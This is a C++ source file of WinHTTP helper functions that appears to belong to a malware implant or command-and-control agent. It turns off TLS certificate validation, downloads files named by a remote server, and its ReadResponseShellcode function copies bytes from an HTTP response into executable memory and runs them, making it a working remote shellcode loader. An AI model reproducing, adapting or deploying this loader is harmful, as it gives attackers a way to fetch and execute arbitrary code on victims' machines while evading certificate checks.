#include "winhttp.hpp"

VOID WinHttpCloseHandles(
	HINTERNET hSession,
	HINTERNET hConnect,
	HINTERNET hRequest
) {
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}

WinHttpHandlers InitRequest(LPCWSTR lpHost, INTERNET_PORT nPort)
{
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;

	hSession = WinHttpOpen(
		L"",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0
	);
	if (!hSession) {
		return {hSession, hConnect};
	}

	hConnect = WinHttpConnect(hSession, lpHost, nPort, 0);
	return {hSession, hConnect};
}

WinHttpResponse SendRequest(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	LPCWSTR lpMethod,
	LPCWSTR lpHeaders,
	LPVOID lpData,
	DWORD dwDataLength
) {
	BOOL bResult = FALSE;
	HINTERNET hRequest = NULL;
	DWORD dwSecFlags = 0;
	DWORD dwDataWrite = 0;
	DWORD dwStatusCode = 0;
	DWORD dwStatusCodeSize = sizeof(dwStatusCode);

	hRequest = WinHttpOpenRequest(
		hConnect,
		lpMethod,
		lpPath,
		NULL,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		WINHTTP_FLAG_SECURE
	);
	if (!hRequest) {
		return {FALSE, hRequest, 0};
	}

	dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
				SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
				SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

	bResult = WinHttpSetOption(
		hRequest,
		WINHTTP_OPTION_SECURITY_FLAGS,
		&dwSecFlags,
		sizeof(DWORD)
	);
	if (!bResult) {
		return {FALSE, hRequest, 0};
	}

	if (!lpHeaders)
	{
		lpHeaders = WINHTTP_NO_ADDITIONAL_HEADERS;
	}

	bResult = WinHttpSendRequest(
		hRequest,
		lpHeaders,
		lpHeaders ? -1 : 0,
		WINHTTP_NO_REQUEST_DATA,
		0,
		dwDataLength,
		0
	);
	if (!bResult) {
		return {FALSE, hRequest, 0};
	}

	if (lpData) {
		bResult = WinHttpWriteData(
			hRequest,
			lpData,
			dwDataLength,
			&dwDataWrite
		);
	}

	bResult = WinHttpReceiveResponse(hRequest, NULL);
	if (!bResult) {
		return {FALSE, hRequest, 0};
	}

	bResult = WinHttpQueryHeaders(
		hRequest, 
		WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
		WINHTTP_HEADER_NAME_BY_INDEX, 
		&dwStatusCode,
		&dwStatusCodeSize,
		WINHTTP_NO_HEADER_INDEX
	);
	if (!bResult) {
		return {FALSE, hRequest, 0};
	}

	return {bResult, hRequest, dwStatusCode};
}

BOOL ReadResponseData(HINTERNET hRequest, const std::wstring& outFile) {
	DWORD dwSize = 0;
	DWORD dwRead = 0;
	LPSTR pszOutBuffer;

	// std::ofstream outFile(sFile, std::ios::binary);
	HANDLE hFile = CreateFileW(
		outFile.c_str(),
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

	do
	{
		if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
		{
			break;
		}
		if (!dwSize)
		{
			break;
		}

		pszOutBuffer = new char[dwSize+1];
		if (!pszOutBuffer)
		{
			break;
		}

		// Read the data
		ZeroMemory(pszOutBuffer, dwSize+1);
		if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwRead))
		{
			// Could not read data.
		}
		else
		{
			DWORD dwWritten;
			if (!WriteFile(hFile, pszOutBuffer, dwRead, &dwWritten, NULL))
			{
				return FALSE;
			}
		}

		delete [] pszOutBuffer;

		if (!dwRead)
			break;
	} while (dwSize > 0);

	// outFile.close();
	CloseHandle(hFile);

	return TRUE;
}

BOOL ReadResponseShellcode(HINTERNET hRequest) {
	DWORD dwSize = 0;
	DWORD dwRead = 0;
	// LPSTR pszOutBuffer;
	char buffer[4096];
	BOOL bResult;

	do
	{
		bResult = WinHttpReadData(
			hRequest,
			(LPVOID)buffer,
			sizeof(buffer),
			&dwRead
		);
		if (!bResult)
		{
			// DisplayMessageBoxA("WinHttpReadData Error", "ReadResponsePayload");
		}

		if (dwRead > 0)
		{
			// Load the payload.
			void* execMem = VirtualAlloc(
				0,
				dwRead,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_EXECUTE_READWRITE
			);
			memcpy(execMem, buffer, dwRead);

			// Execute it.
			((void(*)())execMem)();
		}
	} while (dwRead > 0);
	
	return TRUE;
}

BOOL DownloadFile(
	HINTERNET hConnect,
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpPath,
	const std::wstring& wSrc,
	const std::wstring& wDest
) {
	std::string sSrc = UTF8Encode(wSrc);

	WinHttpResponse resp = SendRequest(
		hConnect,
		lpHost,
		nPort,
		lpPath,
		L"POST",
		L"",
		(LPVOID)sSrc.c_str(),
		(DWORD)strlen(sSrc.c_str())
	);
	if (!resp.bResult || resp.dwStatusCode != 200)
	{
		return {};
	}

	if (!ReadResponseData(resp.hRequest, wDest))
	{
		return FALSE;
	}

	return TRUE;
}
